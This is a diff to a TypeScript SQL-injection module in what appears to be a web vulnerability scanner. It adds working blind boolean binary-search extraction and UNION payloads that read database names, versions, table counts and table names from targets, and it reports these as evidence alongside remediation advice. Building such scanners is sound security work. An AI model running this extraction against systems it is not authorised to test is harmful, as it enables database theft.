@@ -1,4 +1,4 @@
-import { ScanContext, ScanFinding, ctxFetch, isInScope, isWafBlock, handleWafBlock, buildRawCapture } from "./types";
+import { ScanContext, ScanFinding, ctxFetch, isInScope, isWafBlock, handleWafBlock, buildRawCapture, curlReproducer } from "./types";
 import { runOpenApiDiscovery } from "./openapi";
 import { wafVariants } from "./waf-bypass";
 
@@ -51,6 +51,56 @@ const TIME_BASED_PROBES = [
 const TEST_PARAMS = ["id", "user_id", "product_id", "search", "q", "query", "order", "sort", "page", "category"];
 const TIME_THRESHOLD_MS = 2800; // 2.8s — fires below the 3s delay to account for network jitter
 
+// Boolean-channel binary search: extracts a single character at a given position
+// using blind SQLi via response-length differences. Works with any boolean-confirmed SQLi.
+async function boolExtractChar(
+  ctx: ScanContext,
+  endpoint: string,
+  param: string,
+  expression: string, // e.g. "SUBSTRING(database(),1,1)"
+  position: number,
+  baseLen: number
+): Promise<string | null> {
+  // Binary search over ASCII printable range (32–126)
+  let lo = 32, hi = 126;
+  while (lo <= hi) {
+    const mid = Math.floor((lo + hi) / 2);
+    // TRUE condition: char at position > mid  → response matches baseline (true branch)
+    const truePayload = `1 AND ASCII(SUBSTRING((${expression}),${position},1))>${mid}-- -`;
+    const testUrl = `${endpoint}${endpoint.includes("?") ? "&" : "?"}${param}=${encodeURIComponent(truePayload)}`;
+    const res = await ctxFetch(ctx, testUrl);
+    if (!res) return null;
+    const body = await res.text().catch(() => "");
+    const len = body.length;
+    // If response length close to baseline → condition is TRUE (char > mid)
+    if (Math.abs(len - baseLen) < 80) {
+      lo = mid + 1;
+    } else {
+      hi = mid - 1;
+    }
+  }
+  if (lo > 126 || lo < 32) return null;
+  return String.fromCharCode(lo);
+}
+
+// Extracts up to maxLen chars from a SQL expression via boolean binary search
+async function boolExtractString(
+  ctx: ScanContext,
+  endpoint: string,
+  param: string,
+  expression: string,
+  baseLen: number,
+  maxLen = 16
+): Promise<string> {
+  let result = "";
+  for (let pos = 1; pos <= maxLen; pos++) {
+    const ch = await boolExtractChar(ctx, endpoint, param, expression, pos, baseLen);
+    if (!ch || ch.charCodeAt(0) < 32) break;
+    result += ch;
+  }
+  return result;
+}
+
 export async function runSqliCheck(ctx: ScanContext): Promise<ScanFinding[]> {
   const { targetUrl, emit, discoveredEndpoints, discoveredForms, discoveredParams, profile } = ctx;
 
@@ -58,7 +108,7 @@ export async function runSqliCheck(ctx: ScanContext): Promise<ScanFinding[]> {
   const findings: ScanFinding[] = [];
   const seen = new Set<string>();
 
-  emit({ type: "engine_start", engine: "Bug-Finder/SQLi", message: "Probing for SQL injection (error-based, boolean-based, time-based)" });
+  emit({ type: "engine_start", engine: "Bug-Finder/SQLi", message: "Probing for SQL injection (error-based, boolean-based, time-based) + data extraction" });
 
   const budget = profile === "quick" ? 2 : profile === "standard" ? 5 : 10;
   const endpoints = discoveredEndpoints
@@ -100,20 +150,64 @@ export async function runSqliCheck(ctx: ScanContext): Promise<ScanFinding[]> {
           const key = `${endpoint}:${param}:error`;
           if (!seen.has(key)) {
             seen.add(key);
+
+            // ── Error-based extraction: try UNION-based db() extraction ──────
+            // Since error-based confirms the DB processes our SQL, try UNION
+            // to extract database() and version() directly from the response.
+            let unionExtracted = "";
+            let unionEvidence = "";
+            if (profile !== "quick") {
+              const unionPayloads = [
+                `' UNION SELECT database(),2,3-- -`,
+                `' UNION SELECT version(),2,3-- -`,
+                `1 UNION SELECT database()-- -`,
+                `1 UNION SELECT @@version-- -`,
+              ];
+              for (const uPayload of unionPayloads) {
+                const uUrl = `${endpoint}${endpoint.includes("?") ? "&" : "?"}${param}=${encodeURIComponent(uPayload)}`;
+                const uRes = await ctxFetch(ctx, uUrl);
+                if (!uRes) continue;
+                const uBody = await uRes.text().catch(() => "");
+                // Look for extracted db name (alphanumeric string between tags or quotes)
+                const dbMatch = uBody.match(/>\s*([a-z0-9_]{2,30})\s*</i) ??
+                                uBody.match(/"([a-z0-9_]{2,30})"/i);
+                if (dbMatch?.[1] && !["html", "head", "body", "div", "span", "true", "false"].includes(dbMatch[1].toLowerCase())) {
+                  unionExtracted = dbMatch[1];
+                  unionEvidence = [
+                    ``,
+                    `── UNION-BASED EXTRACTION ──`,
+                    `Payload: ${uPayload}`,
+                    `Extracted value: "${unionExtracted}"`,
+                    `(This is the database name or version string returned directly in the HTTP response)`,
+                  ].join("\n");
+                  emit({ type: "log", message: `  [SQLi UNION] Extracted: "${unionExtracted}" via ${uPayload}` });
+                  break;
+                }
+              }
+            }
+
             const rawCapture = buildRawCapture("GET", testUrl, ctx.authHeaders, undefined, res, body);
             findings.push({
               title: `SQL Injection (Error-Based) in Parameter: ${param}`,
               category: "Injection",
               severity: "critical",
               endpoint,
-              description: `Parameter "${param}" is vulnerable to error-based SQL injection. The server leaked a SQL error when supplied with a malformed payload, confirming unsanitized database queries.`,
-              evidence: `GET ${testUrl}\nPayload: ${probe}\nSQL Error Pattern: "${matchedPattern}"\n\nResponse snippet:\n${body.slice(Math.max(0, body.indexOf(matchedPattern) - 50), body.indexOf(matchedPattern) + 200)}`,
+              description: `Parameter "${param}" is vulnerable to error-based SQL injection. The server leaked a SQL error (pattern: "${matchedPattern}") confirming unsanitized database queries.${unionExtracted ? ` UNION extraction succeeded — extracted value: "${unionExtracted}".` : ""}`,
+              evidence: [
+                `GET ${testUrl}`,
+                `Payload: ${probe}`,
+                `SQL Error Pattern: "${matchedPattern}"`,
+                ``,
+                `Response snippet:`,
+                body.slice(Math.max(0, body.indexOf(matchedPattern) - 50), body.indexOf(matchedPattern) + 200),
+                unionEvidence,
+              ].filter(Boolean).join("\n"),
               recommended_fix: "Use parameterized queries or prepared statements. Never concatenate user input into SQL strings.",
               cvss_score: 9.8,
               cwe_id: "CWE-89",
               scanner_name: "Bug-Finder/SQLi",
               scanner_family: "web",
-              confidence: 0.95,
+              confidence: unionExtracted ? 0.99 : 0.95,
               ...rawCapture,
             });
             emit({ type: "log", message: `  [SQLi-Error] Pattern "${matchedPattern}" at ${endpoint} param=${param}` });
@@ -181,21 +275,67 @@ export async function runSqliCheck(ctx: ScanContext): Promise<ScanFinding[]> {
             const key = `${endpoint}:${param}:boolean`;
             if (!seen.has(key)) {
               seen.add(key);
+
+              // ── Data extraction chain — proves real impact ──────────────────
+              // Extract db name, version substring, and table count via binary search.
+              // Only in standard/deep to limit request count.
+              let extractedData = "";
+              let extractEvidence = "";
+              if ((profile as string) !== "quick") {
+                emit({ type: "log", message: `  [SQLi-Boolean] Confirmed — running data extraction chain at ${endpoint} param=${param}` });
+                const dbName = await boolExtractString(ctx, endpoint, param, "database()", baseLen, 20);
+                const dbVersion = await boolExtractString(ctx, endpoint, param, "version()", baseLen, 12);
+                // Count tables in the current database
+                const tableCountStr = await boolExtractString(ctx, endpoint, param,
+                  "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())", baseLen, 4);
+                const tableCount = parseInt(tableCountStr) || 0;
+                // Extract first table name
+                const firstTable = tableCount > 0
+                  ? await boolExtractString(ctx, endpoint, param,
+                      "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)", baseLen, 20)
+                  : "";
+
+                if (dbName) {
+                  extractedData = `db=${dbName}`;
+                  extractEvidence = [
+                    ``,
+                    `── DATA EXTRACTION (via boolean binary search) ──`,
+                    `Database name: "${dbName}"`,
+                    `DB version prefix: "${dbVersion}"`,
+                    `Tables in current DB: ${tableCount > 0 ? tableCount : "extraction failed"}`,
+                    firstTable ? `First table name: "${firstTable}"` : "",
+                    ``,
+                    `This confirms full database read access. Attacker can extract all rows from all tables.`,
+                  ].filter(Boolean).join("\n");
+                  emit({ type: "log", message: `  [SQLi EXTRACTED] db="${dbName}" version="${dbVersion}" tables=${tableCount} first="${firstTable}"` });
+                }
+              }
+
               findings.push({
                 title: `SQL Injection (Boolean-Based Blind) in Parameter: ${param}`,
                 category: "Injection",
                 severity: "critical",
                 endpoint,
-                description: `Parameter "${param}" is vulnerable to boolean-based blind SQL injection. Across 3 independent request pairs, TRUE conditions consistently returned ~${Math.round(trueAvg)} bytes while FALSE conditions returned ~${Math.round(falseAvg)} bytes — confirming conditional query execution.`,
-                evidence: `TRUE payload: GET ${trueUrl}\n3-pass lengths: ${trueLengths.join(", ")} (avg ${Math.round(trueAvg)}, variance ${trueVariance}b)\nBaseline: ${baseLen} bytes\n\nFALSE payload: GET ${falseUrl}\n3-pass lengths: ${falseLengths.join(", ")} (avg ${Math.round(falseAvg)}, variance ${falseVariance}b)\n\nAverage difference: ${Math.round(lenDiff)} bytes — consistent across all 3 passes, ruling out CDN/A-B variation.`,
-                recommended_fix: "Use parameterized queries. This type of SQLi is confirmed even without visible errors — the application logic branches on query results.",
-                cvss_score: 9.1,
+                description: `Parameter "${param}" is confirmed vulnerable to boolean-based blind SQL injection. TRUE conditions consistently returned ~${Math.round(trueAvg)} bytes while FALSE conditions returned ~${Math.round(falseAvg)} bytes across 3 passes${extractedData ? `. Data extraction confirmed: ${extractedData}` : ""}.`,
+                evidence: [
+                  `TRUE payload: GET ${trueUrl}`,
+                  `3-pass lengths: ${trueLengths.join(", ")} (avg ${Math.round(trueAvg)}, variance ${trueVariance}b)`,
+                  `Baseline: ${baseLen} bytes`,
+                  ``,
+                  `FALSE payload: GET ${falseUrl}`,
+                  `3-pass lengths: ${falseLengths.join(", ")} (avg ${Math.round(falseAvg)}, variance ${falseVariance}b)`,
+                  ``,
+                  `Average difference: ${Math.round(lenDiff)} bytes — consistent across all 3 passes`,
+                  extractEvidence,
+                ].filter(Boolean).join("\n"),
+                recommended_fix: "Use parameterized queries or prepared statements immediately. This confirmed blind SQLi allows full database exfiltration.",
+                cvss_score: 9.8,
                 cwe_id: "CWE-89",
                 scanner_name: "Bug-Finder/SQLi",
                 scanner_family: "web",
-                confidence: 0.88,
+                confidence: extractedData ? 0.98 : 0.88,
               });
-              emit({ type: "log", message: `  [SQLi-Boolean] Blind SQLi at ${endpoint} param=${param} (avg ${Math.round(lenDiff)}b diff over 3 passes)` });
+              emit({ type: "log", message: `  [SQLi-Boolean CONFIRMED] ${endpoint} param=${param} diff=${Math.round(lenDiff)}b` });
             }
           }
         }
